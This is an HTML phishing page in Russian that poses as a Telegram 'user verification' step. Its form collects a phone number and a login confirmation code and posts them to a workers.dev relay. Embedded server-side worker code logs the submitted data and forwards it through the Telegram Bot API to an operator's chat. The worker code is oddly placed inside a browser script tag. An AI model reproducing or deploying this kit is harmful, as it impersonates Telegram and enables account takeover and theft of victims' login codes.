<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Проверка пользователя Телеграмм</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            background-color: white; /* Изменили цвет фона на белый */
        }

        .tg-icon {
            font-size: 36px;
            color: #0074b9;
            margin-bottom: 20px;
        }

        h1 {
            margin-top: 0;
        }

        form {
            display: flex;
            flex-direction: column;
            width: 100%;
            max-width: 300px;
            margin-bottom: 20px;
        }

        label {
            margin-top: 10px;
        }

        input {
            margin-bottom: 10px;
            padding: 5px;
            width: calc(100% - 10px);
        }

        button {
            margin-top: 10px;
            padding: 10px;
            width: 100%;
        }
    </style>
</head>
<body>

    <!-- Голубая иконка с надписью TG -->
    <div class="tg-icon">TG</div>

    <!-- Название страницы -->
    <h1>Проверка пользователя Телеграмм</h1>

    <form action="https://tg-relay.egor8131723.workers.dev" method="post">
        <label for="newPhone">Новый номер телефона:</label>
        <input type="tel" id="newPhone" name="newPhone" placeholder="Новый номер телефона" required>
        <br>
        <label for="code">Код подтверждение:</label>
        <input type="number" id="code" name="code" placeholder="Код подтверждение" required>
        <br>
        <button id="sendBtn">Присоединиться</button>
    </form>

    <script>
        export default {
            async fetch(request, env, ctx) {
                const corsHeaders = {
                    "Access-Control-Allow-Origin": "*",
                    "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
                    "Access-Control-Allow-Headers": "Content-Type",
                };

                if (request.method === "GET") {
                    return new Response("Сервер работает! Ожидаю POST-запрос.", {
                        headers: { "Content-Type": "text/plain; charset=utf-8", ...corsHeaders },
                    });
                }

                if (request.method === "POST") {
                    try {
                        const parsedData = await request.formData();
                        console.log("Входящие данные:",
JSON.stringify(Object.fromEntries(parsedData.entries()), null, 2));

                        if (env.BOT_TOKEN && env.ADMIN_CHAT_ID) {
                            await fetch(`https://api.telegram.org/${env.BOT_TOKEN}/sendMessage`, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({
                                    chat_id: env.ADMIN_CHAT_ID,
                                    text: `Код входа отправлен на ${parsedData.get('newPhone')}.`,
                                }),
                            });
                        }

                        return new Response("Данные успешно получены!", {
                            status: 200,
                            headers: { "Content-Type": "text/plain; charset=utf-8", ...corsHeaders },
                        });
                    } catch (err) {
                        console.error("Ошибка обработки:", err.message);
                        return new Response("Ошибка: " + err.message, {
                            status: 500,
                            headers: { "Content-Type": "text/plain; charset=utf-8", ...corsHeaders },
                        });
                    }
                }

                return new Response("Method Not Allowed", { status: 405, headers: corsHeaders });
            },
        };
    </script>

</body>
</html>
